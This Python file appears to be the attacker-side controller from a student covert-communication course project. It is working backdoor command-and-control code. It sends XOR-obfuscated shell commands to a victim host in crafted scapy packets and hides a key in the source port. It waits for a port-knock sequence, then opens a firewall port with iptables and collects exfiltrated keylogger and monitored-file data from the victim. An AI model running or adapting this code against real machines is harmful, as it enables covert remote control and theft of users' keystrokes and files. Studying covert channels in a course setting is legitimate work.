#!/usr/bin/python3
# attacker.py

# COMP 8505 - Project: Covert Communication Application
# Warisha Bilal
# A01022530
# June 19, 2023

"""
project

"""

import yaml
import time
from scapy.all import *
from threading import Thread
from scapy.layers.inet import IP, UDP, TCP


# This function will create and send a UDP packet using scapy
# The UDP packet will contain an encrypted key in the header
# And encrypted payload which will contain commands to execute.
def create_packet(victim_ip, protocol, source_port, payload):

    try:

        if protocol == 'udp':
            # Create a packet using scapy
            send(IP(dst=victim_ip)/UDP(sport=source_port, dport=source_port)/payload)
        if protocol == 'tcp':
            send(IP(dst=victim_ip)/TCP(sport=source_port, dport=source_port)/payload)

    except Exception as e:
        print(f"Error: {e}")
        quit()


# This function is used to encrypt and decrypt both the header key and commands
def xor_encrypt_decrypt(xor_key, data):

    try:
        for i in range(len(data)):
            data = (data[:i] +
                    chr(ord(data[i]) ^ ord(xor_key)) +
                    data[i+1:])
            # print(data[i], end="")
        return data

    except Exception as e:
        print(f"Error: {e}")
        quit()


# This function converts the encrypted/decrypted data to decimal
def convert_to_dec(data):

    try:
        dec = ''
        for i in range(len(data)):
            dec += str(ord(data[i]))
            dec = int(dec) * 256

        return dec

    except Exception as e:
        print(f"Error: {e}")
        quit()


def get_data(attacker_iface, victim_ip, protocol, xor_key, command_file):

    try:
        # Create a packet using scapy
        filter = '{} and src host {}'.format(protocol, victim_ip)
        results = sniff(iface=attacker_iface, filter=filter, timeout=5, promisc=True)
        for result in results:
            # print(result.summary())
            if result.payload:
                data = bytes(result.payload).decode('unicode_escape')
                data = xor_encrypt_decrypt(xor_key, data)
                print(data)
                with open(command_file, 'a+') as f:
                    f.write(data)
                    # f.close()

    except Exception as e:
        print(f"Error: {e}")
        quit()


class SniffThread(Thread):

    def __init__(self, threadID, name, delay, iface, victim_ip, port_list, open_port, monitor_file, keylog_file, timer, EOL):
        Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.delay = delay
        self.iface = iface
        self.victim_ip = victim_ip
        self.port_list = port_list
        self.open_port = open_port
        self.monitor_file = monitor_file
        self.keylog_file = keylog_file
        self.timer = timer
        self.EOL = EOL

    def run(self):

        iface = self.iface
        victim_ip = self.victim_ip
        port_list = self.port_list
        open_port = self.open_port
        monitor_file = self.monitor_file
        keylog_file = self.keylog_file
        timer = self.timer
        EOL = self.EOL
        knock_list = []

        while True:

            for i in range(3):
                # Use "tcp[tcpflags] & tcp-syn != 0" for tcp syn packets only
                filter = 'tcp[tcpflags] & tcp-syn != 0 and src host {}'.format(victim_ip)
                knock_received = sniff(iface=iface, filter=filter, count=1, promisc=True)

                for knock in knock_received:
                    knock_list.append(knock[TCP].dport)

                if knock_list == port_list:
                    print("\nPort Knock received...")
                    print("Opening port {}".format(open_port))
                    os.system('iptables -I INPUT -p tcp --dport {} -j ACCEPT'.format(open_port))
                    start_time = time.time()
                    # knock_list.clear()
                    # while (time.time() - start_time) != timer:

                    get_file_contents = sniff(iface=iface, filter=filter, timeout=5, promisc=True)
                    for file_contents in get_file_contents:
                        if file_contents[TCP].payload:
                            data = bytes(file_contents[TCP].payload).decode('unicode_escape')
                            data = xor_encrypt_decrypt('P', data)
                            # print(data)

                            if EOL in data:
                                data = data.split(EOL)

                                # print(data)

                                if monitor_file in data[0]:
                                    with open(monitor_file, 'a') as f:
                                        f.write(data[0])
                                        f.close()
                                else:
                                    with open(keylog_file, 'a') as f:
                                        f.write(data[0])
                                        f.close()
                    time.sleep(timer)
                    os.system('iptables -F')
            # break


def main():

    # Reads the config file
    with open('config.yml', 'r') as config:
        config_file = yaml.safe_load(config.read())

        # Backdoor and client network
        attacker_iface = config_file['attacker_iface']
        attacker_ip = config_file['attacker_ip']
        victim_ip = config_file['victim_ip']
        protocol = config_file['protocol']

        # Encryption variables
        header_key = config_file['header_key']
        xor_key = config_file['xor_key']
        EOL = config_file['EOL']

        port_list = config_file['port_list']
        open_port = config_file['open_port']
        monitor_file = config_file['monitor_file']
        keylog_file = config_file['keylog_file']
        command_output = config_file['command_output']
        timer = config_file['timer']

        config.close()

    t1 = SniffThread(1, 'Sniff', 0, attacker_iface, victim_ip, port_list, open_port, monitor_file, keylog_file, timer, EOL)

    # Daemonize the thread so it runs in the background
    # t1.daemon = True

    # Start the thread
    t1.start()

    # Waits to complete thread before starting another
    # t1.join()

    # Ask user for input
    while True:
        command = input("Type a command (ie. ls): ")

        if command:
            command = command + EOL
            encrypted_header_key = xor_encrypt_decrypt(xor_key, header_key)
            source_port = convert_to_dec(encrypted_header_key)
            encrypted_commands = xor_encrypt_decrypt(xor_key, command)
            create_packet(victim_ip, protocol, source_port, encrypted_commands)
            get_data(attacker_iface, victim_ip, protocol, xor_key, command_output)


if __name__ == "__main__":
    main()
